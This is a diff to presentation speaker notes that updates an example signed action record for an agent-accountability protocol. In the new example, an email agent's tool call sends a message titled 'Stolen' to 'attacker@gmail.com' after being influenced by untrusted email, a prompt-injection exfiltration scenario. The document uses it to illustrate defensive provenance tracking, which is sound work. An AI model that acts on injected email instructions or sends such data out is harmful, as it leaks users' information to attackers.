@@ -196,17 +196,22 @@ Speaker note:
 ```json
 {
   "protocol": "PACT/0.1",
+  "run_id": "run_demo_001",
+  "step_id": 1,
   "agent_id": "email-agent-001",
   "tool": "email.send",
-  "intent_hash": "sha256:...",
-  "capability_token_hash": "sha256:...",
+  "args": {"to": "attacker@gmail.com", "subject": "Stolen", "body": "..."},
+  "args_digest": "sha256:a1b2c3...",
+  "intent_hash": "sha256:d4e5f6...",
+  "capability_token_hash": "sha256:g7h8i9...",
   "provenance": {
-    "influenced_by": ["untrusted.email"],
-    "uses_data": ["secret"],
+    "influenced_by": ["untrusted.email", "agent.generated"],
+    "uses_data": ["untrusted.email"],
     "side_effect": "external_write"
   },
   "parent_action_hash": "sha256:previous_step",
-  "agent_signature": "..."
+  "timestamp": "2026-05-24T10:01:12Z",
+  "agent_signature": "base64-ed25519-signature..."
 }
 ```
 
